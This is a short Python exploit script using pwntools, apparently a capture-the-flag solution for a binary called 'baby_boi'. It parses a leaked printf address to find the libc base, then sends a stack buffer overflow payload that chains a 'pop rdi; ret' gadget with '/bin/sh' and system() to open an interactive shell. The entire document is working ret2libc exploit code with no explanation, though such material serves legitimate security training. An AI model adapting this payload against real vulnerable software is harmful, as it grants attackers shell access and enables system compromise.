from pwn import *

exe = './baby_boi'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
libc = ELF("./libc-2.27.so")
printf = libc.sym["printf"]
rop = ROP(elf)


ropAdd = rop.find_gadget(['pop rdi','ret'])[0]

sys = libc.sym["system"]

binsh = next(libc.search(b"/bin/sh"))

# print(ropAdd)

# p = gdb.debug(['./baby_boi'],'''
#     break main
#     break *0x000000000040072e
#     ''')
p = process(['./baby_boi'])#, env={"LD_LIBRARY_PATH":"./libc-2.27.so"})
print(p.recvuntil(b"Here I am: "))

printf_loc = int(p.recv()[:-1].decode('utf-8'),16)
print('printf_loc: ', hex(printf_loc))
libbase = printf_loc - printf
print('libase:',hex(libbase))

payload = b"A"*(0x30-8)+ p64(ropAdd) + p64(binsh+libbase-4) + p64(sys+libbase)
p.sendline(payload)

p.interactive()